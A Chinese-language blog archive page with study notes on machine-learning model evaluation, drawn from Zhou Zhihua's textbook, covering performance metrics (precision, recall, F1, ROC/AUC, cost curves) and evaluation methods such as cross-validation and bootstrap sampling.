<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml7_02.png?raw=true" alt=""></p>
<p>但是我们的分类器是根据y/(1-y)进行决策的，为了适应它，我们只需要“再缩放”一下：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml7_03.png?raw=true" alt=""></p>
<h2 id="0x05-参考文档"><a href="#0x05-参考文档" class="headerlink" title="0x05 参考文档"></a>0x05 参考文档</h2><p>《机器学习》——周志华</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/25/机器学习-6-——性能度量/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/07/25/机器学习-6-——性能度量/" itemprop="url">
                  机器学习(6)——性能度量
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-25T14:40:28+08:00">
                2018-07-25
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/机器学习/" itemprop="url" rel="index">
                    <span itemprop="name">机器学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/07/25/机器学习-6-——性能度量/" class="leancloud_visitors" data-flag-title="机器学习(6)——性能度量">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-性能度量"><a href="#0x00-性能度量" class="headerlink" title="0x00 性能度量"></a>0x00 性能度量</h2><p>对学习器泛化性能进行评估时，不仅需要有效可行的实验估计方法，还需要有衡量模型泛化能力的评价标准，这就是性能度量。</p>
<p>性能度量反映任务需求，在对比不同模型的能力时，使用不同的性能度量往往会导致不同的评判结果，也就是说，模型的好坏是相对的，需要根据实际情况进行选择。</p>
<h2 id="0x01-回归任务中的性能度量"><a href="#0x01-回归任务中的性能度量" class="headerlink" title="0x01 回归任务中的性能度量"></a>0x01 回归任务中的性能度量</h2><p>回归任务中最常用的性能度量是“均方误差”(mean squared error)</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_01.png?raw=true" alt=""></p>
<p>对于一般的数据分布D和概率密度函数p，均方误差可以表示为：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_02.png?raw=true" alt=""></p>
<h2 id="0x02-分类任务中的性能度量"><a href="#0x02-分类任务中的性能度量" class="headerlink" title="0x02 分类任务中的性能度量"></a>0x02 分类任务中的性能度量</h2><h3 id="错误率与精度"><a href="#错误率与精度" class="headerlink" title="错误率与精度"></a>错误率与精度</h3><p>分类任务中最常用的两种性能度量就是错误率和精度，同时适用于二分类和多分类任务。</p>
<p>错误率是分类错误的样本数占样本总数的比例。</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_01.png?raw=true" alt=""></p>
<p>精度是分类正确的样本数占样本总数的比例。</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_04.png?raw=true" alt=""></p>
<p>对于一般的数据分布D和概率密度函数p，错误率和精度可以表示为：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_05.png?raw=true" alt=""></p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_06.png?raw=true" alt=""></p>
<h3 id="查准率、查全率与F1"><a href="#查准率、查全率与F1" class="headerlink" title="查准率、查全率与F1"></a>查准率、查全率与F1</h3><p>错误率和精度只能表示一部分的性能，如果我们要深入的研究这个问题，就需要用到别的性能度量。</p>
<p>查准率P是我们检索到的样本中有多少比例是正确的。</p>
<p>查全率R是正确的样本中有多少被检索到了。</p>
<table>
<thead>
<tr>
<th>真实情况\预测结果</th>
<th>正例</th>
<th>反例</th>
</tr>
</thead>
<tbody>
<tr>
<td>正例</td>
<td>TP(真正例)</td>
<td>FN(假反例)</td>
</tr>
<tr>
<td>反例</td>
<td>FP(假正例)</td>
<td>TN(真反例)</td>
</tr>
</tbody>
</table>
<p>从定义我们就可以得出，差准率和查拳率是一堆矛盾的变量。一般情况下，查准率高时查全率就会低；查全率高时查准率就会低。</p>
<p>如果我们我们根据学习器的预测结果对样例排序，最可能正确的排在最前，最可能错误的排在最后。按照这个顺序逐个把样本作为正确的进行预测，则每次可以计算出当前查全率、查准率。</p>
<p>然后以查准率为纵轴，查全率为横轴作图，就得到了查准率-查全率曲线，也称为“P-R”曲线。</p>
<p>如图：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_07.png?raw=true" alt=""></p>
<p>P-R图可以直观的表示学习器在总样本上的查全率和查准率，如果一个学习器的P-R曲线被另一个学习器的P-R曲线完全包住，则可以断言后者的性能优于前者。如果P-R曲线交叉，则需要根据实际的需求来进行比较。如果一定要把学习器的性能分个高低，一个比较合理的判据是比较P-R曲线下面积的大小，它在一定程度上表征了学习器在查准率和查全率上取得相对“双高”的比例。</p>
<p>这个面积值不容易估算，所以又设计了一些综合考虑查准率和查全率的性能度量。平衡点（Break-Event Point）就是这样一个度量，它是“查准率=查全率”时的取值，可以通过比较BEP值来比较学习器的性能。</p>
<p>但是BEP过于简化，我们更常用的的是F1度量：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_08.png?raw=true" alt=""></p>
<p>其中TP是假设正确并且实际正确的样例数，TN是假设错误并且实际错误的样例数。</p>
<p>在实际的应用中，我们要根据不同需求改变对查准率和查全率的重视程度。如商品推荐中应该尽可能推荐用户最感兴趣的，查准率更重要；在逃犯信息检索中，需要尽可能不漏掉逃犯，所以查全率更重要。所以就引出了F1度量的一般形势Fβ，能表达出对查准率和查全率的不同偏好。</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_09.png?raw=true" alt=""></p>
<p>其中β代表查全率与查准率的相对重要性，在β=1时，就是F1；在β&gt;1时，查全率更重要；在β&lt;1时，查准率更重要。</p>
<h3 id="ROC与AUC"><a href="#ROC与AUC" class="headerlink" title="ROC与AUC"></a>ROC与AUC</h3><p>在分类时，我们会选择一个阈值判别，我们将学习器的预测结果对样例排序，最可能正确的排在最前，最可能错误的排在最后。然后我们可以通过一个截断点来把样本分成两部分。在不同的任务中，我们可以根据实际的需求选择不同位置的截断点，如果我们更重视“查准率”，则可以选择排序中靠前的位置进行截断；若更重视“查全率”，则可选择靠后的位置进行截断。</p>
<p>ROC全称是“受试者工作特征”曲线，我们根据学习器的预测结果对样例进行排序，按此顺序逐个把样本作为正例进行预测，每次计算出两个重要量的值，分别以它们为横纵坐标做图，就得到了ROC曲线。与P-R曲线使用查准率、查全率为横、纵轴不同，ROC曲线纵轴是“真正例率”（TPR），横轴是“假正例率”（FPR）。</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_10.png?raw=true" alt=""></p>
<p>进行学习器比较时，若一个学习器的ROC曲线被另一个学习器的ROC曲线完全包裹，那么可以断言后者性能优于前者，若两个学习器发生交叉，则比较ROC曲线下的面积，即AUC(Area Under ROC Curve)</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_11.png?raw=true" alt=""></p>
<h3 id="代价敏感错误率与代价曲线"><a href="#代价敏感错误率与代价曲线" class="headerlink" title="代价敏感错误率与代价曲线"></a>代价敏感错误率与代价曲线</h3><p>在现实情况中，分类错误之后不同类型错误所造成的后果也不同，比如安检通道把钥匙等金属制品错误的分类到危险品，仅仅是多了一层人工检查的麻烦；但是如果把一把刀错误的分类到安全品里面，那么可能造成十分严重的后果。不同的错误造成的损失是不同的，为了权衡这个损失，可以为错误赋予“非均等代价”(unequal cost)。</p>
<p>我们可以用一张表来代表代价：</p>
<table>
<thead>
<tr>
<th>真实类别\预测类别</th>
<th>第0类</th>
<th>第1类</th>
</tr>
</thead>
<tbody>
<tr>
<td>第0类</td>
<td>0</td>
<td>cost01</td>
</tr>
<tr>
<td>第1类</td>
<td>cost10</td>
<td>0</td>
</tr>
</tbody>
</table>
<p>如果是多分类问题，costij代表第i类的错误被归到第j类所引起的代价。</p>
<p>我们前面的几种方法都是以最小化错误次数为目标的，也就是认为所有错误的代价是均等的。</p>
<p>在非均等代价下，就需要代价曲线来表示学习器的总体代价。代价曲线图的横轴取值为[0,1]的正例概率代价：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_12.png?raw=true" alt=""></p>
<p>代价曲线的绘制则是ROC上每一点对应了代价平面上的一条线段，设ROC曲线上点的坐标是(TPR,FPR)，则可以计算出FNR，然后在代价平面上绘制一条从(0,FPR)到(1,FNR)的线段，线段下的面积即表示了该条件下的期望总体代价。</p>
<p>然后将ROC曲线上的每个点都这样转换成一条线段，再取所有线段的下界，围成的面积即为在所有条件下学习器的期望总体代价。如图：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_13.png?raw=true" alt=""></p>
<h2 id="0x03-参考文档"><a href="#0x03-参考文档" class="headerlink" title="0x03 参考文档"></a>0x03 参考文档</h2><p>《机器学习》——周志华</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/24/机器学习-5-——模型评估方法/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/07/24/机器学习-5-——模型评估方法/" itemprop="url">
                  机器学习(5)——模型评估方法
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-24T20:42:30+08:00">
                2018-07-24
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/机器学习/" itemprop="url" rel="index">
                    <span itemprop="name">机器学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/07/24/机器学习-5-——模型评估方法/" class="leancloud_visitors" data-flag-title="机器学习(5)——模型评估方法">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-模型评估与选择"><a href="#0x00-模型评估与选择" class="headerlink" title="0x00 模型评估与选择"></a>0x00 模型评估与选择</h2><p>在机器学习中，我们需要对使用的模型进行评估，对误差等进行分析，来选择一个预测准确率最高的模型。</p>
<h2 id="0x01-误差"><a href="#0x01-误差" class="headerlink" title="0x01 误差"></a>0x01 误差</h2><p>我们把学习器的实际预测输出与样本的真实输出之间的差异称为误差。</p>
<ul>
<li><p>经验误差：学习器在训练集上的误差称为训练误差或经验误差。</p>
</li>
<li><p>泛化误差：将训练好的模型用在新样本上的误差称为泛化误差。</p>
</li>
</ul>
<p>机器学习的目的是为了预测新样本的情况，所以我们需要在新样本上表现很好的学习器，即需要得到一个泛化误差小的学习器。</p>
<h2 id="0x02-过拟合与欠拟合"><a href="#0x02-过拟合与欠拟合" class="headerlink" title="0x02 过拟合与欠拟合"></a>0x02 过拟合与欠拟合</h2><ul>
<li><p>过拟合：学习器把训练样本自身的一些特点当作了所有潜在样本都会具有的一般性质，导致泛化性能下降。一般是由于学习能力过强，将训练样本所包含的不太一般的性质都学到了。</p>
</li>
<li><p>欠拟合：学习器学习能力过弱，对训练样本的一般性质尚未学好</p>
</li>
</ul>
<p>欠拟合比较容易克服，可以在决策树学习中扩展分支、在神经网络中增加训练轮数等。</p>
<p>过拟合则难克服，过拟合是机器学习面临的关键障碍，各类学习算法都有一些针对过拟合的措施来缓解过拟合。</p>
<h2 id="0x03-评估方法"><a href="#0x03-评估方法" class="headerlink" title="0x03 评估方法"></a>0x03 评估方法</h2><p>为了对学习器的泛化误差进行评估，需要使用一个测试集来测试学习器对新样本的判别能力，然后以测试集上的测试误差作为泛化误差的近似。</p>
<p>测试集应该尽量与训练集互斥，即测试样本尽量不在训练集中出现、未在训练集中使用过。</p>
<p>下来介绍几种常用的评估方法：</p>
<h3 id="留出法"><a href="#留出法" class="headerlink" title="留出法"></a>留出法</h3><p>留出法是直接将数据集D划分为两个互斥的几何，其中一个集合作为训练集S，另一个作为测试集T。</p>
<p>在训练集S中训练出模型后，用测试集T来评估其测试误差，作为对泛化误差的估计。</p>
<p>训练/测试集要尽可能的保证数据分布的一致性，避免因数据划分过程引入额外的偏差而对最终结果产生影响。具体做法是尽可能保留类别比例，最好使用分层采样的方法。</p>
<h3 id="交叉验证法"><a href="#交叉验证法" class="headerlink" title="交叉验证法"></a>交叉验证法</h3><p>交叉验证法先将数据集D划分为k个大小相似的互斥子集，每个子集尽可能的保证数据分布的一致性。<br>然后每次使用k-1个子集作为训练集，余下的一个子集作为测试集。<br>这样就可以得到k组训练/测试集，可以进行k次训练和测试，最终返回的是k个测试结果的均值。</p>
<p>交叉验证法评估结果的稳定性和保真性在很大程度上取决于k的取值。<br>通常将交叉验证法称为“k折交叉验证”。如k取10，则称为10折交叉验证。</p>
<h3 id="留一法"><a href="#留一法" class="headerlink" title="留一法"></a>留一法</h3><p>如果数据集D中包含m个样本，若令k=m，则得到了交叉验证法的一个特例：留一法。</p>
<p>显然，留一法不受随机样本划分方式的影响，因为留一法只有唯一一种划分方式。</p>
<p>留一法的评估结果往往被认为比较准确。但是留一法也存在缺陷，当数据集较大时，训练m个模型的计算开销非常大。比如我们是上千万级的数据，那么就得训练上千万个模型，这是不现实的。</p>
<h3 id="自助法"><a href="#自助法" class="headerlink" title="自助法"></a>自助法</h3><p>上述几种方法都存在一个问题，那就是由于保留了一部分样本用于测试，导致实际评估的模型所使用的训练集比D小，会引起一些误差，而自助法，可以解决这个问题。</p>
<p>自助法以自助采样法为基础，给定包含m个样本的数据集D，对它进行采样产生数据集D’：<br>每次随机从D中挑选一个样本，再将样本放回初始数据集中，使得该样本在下次采样时仍有可能被采到。这个过程重复执行m次后，我们就得到了包含m个样本的数据集D’，这就是自助采样的结果。</p>
<p>D中有一部分样本会在D’中多次出现，而另一部分样本不出现。可以做一个简单的估计，样本在m次采样中始终不被采到的概率是<br><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml5_01.png?raw=true" alt=""></p>
<p>取极限得到<br><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml5_02.png?raw=true" alt=""></p>
<p>即通过自助采样，初始数据集中约有36.8%的样本未出现在采样数据集D’中，于是我们可以将D’用作训练集，D-D’用作测试集，这样世纪评估的模型与期望评估的模型都使用了m个训练样本，而我们仍然有数据总量36.8%、未在训练集中出现的样本用于测试。这样的测试结果，也被称为“包外估计”。</p>
<p>自助法在数据集较小、难以有效划分训练/测试集时很有用；此外，自助法能从初始数据集中产生多个不同的训练集，这对集成学习等方法有很大的好处。</p>
<p>自助法的缺陷是：自助法产生的数据集改变了初始数据集的分布，这会引入估计误差。</p>
<p>所以在初始数据集够用的情况下，留出法和交叉验证法更常用。</p>
<h2 id="0x04-调参与最终模型"><a href="#0x04-调参与最终模型" class="headerlink" title="0x04 调参与最终模型"></a>0x04 调参与最终模型</h2><p>大多数学习算法都有参数需要设定，参数配置不同，学得模型的性能往往有显著差别。因此，在进行模型评估与选择时，除了要对适用学习算法进行选择，还需要对算法参数进行设定，这就是通常所说的“参数调节”。</p>
<p>给定包含m个样本的数据集D，在模型评估与选择过程中由于需要留出一部分数据进行评估测试，事实上我们只使用了一部分数据训练模型。因此，在模型选择完成后，学习算法和参数配置已选定，我们要用数据集D重新训练模型，使用所有的m个样本。这时产生的模型才是最终模型。</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel sidebar-panel-active">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/uploads/avatar.jpg"
               alt="麻薯" />
          <p class="site-author-name" itemprop="name">麻薯</p>
           
              <p class="site-description motion-element" itemprop="description"></p>
          
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
              <a href="/archives">
                <span class="site-state-item-count">102</span>
                <span class="site-state-item-name">日志</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              <a href="/categories/index.html">
                <span class="site-state-item-count">24</span>
                <span class="site-state-item-name">分类</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/index.html">
                <span class="site-state-item-count">63</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        

        <div class="links-of-author motion-element">
          
        </div>

        
        

        
        

        

		
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">麻薯</span>
</div>


<div class="powered-by">
  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Muse
  </a>
</div>


        

        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  






  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>



  


  




	





  





  





  






  





  

  
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
  <script>AV.initialize("GWhcWVw7VpoLTRfaQ2D1q3fj-gzGzoHsz", "4eb8jdrkQzBrcf7sJImJdOPd");</script>
  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
          for(var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = document.getElementById(url);
            var countSpan = $(element).find(COUNT_CONTAINER_REF);
            if( countSpan.text() == '') {
              countSpan.text(0);
            }
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(counter.get('time'));
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("title", title);
            newcounter.set("url", url);
            newcounter.set("time", 1);
            newcounter.save(null, {
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>



  

  

  

  <a href="https://github.com/echohun"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://camo.githubusercontent.com/567c3a48d796e2fc06ea80409cc9dd82bf714434/68747470733a2f2f73332e616d617a6f6e6177732e636f6d2f6769746875622f726962626f6e732f666f726b6d655f6c6566745f6461726b626c75655f3132313632312e706e67" alt="fork me on github" data-canonical-src="https://s3.amazonaws.com/github/ribbons/forkme_left_darkblue_121621.png"></a>
</body>
</html>
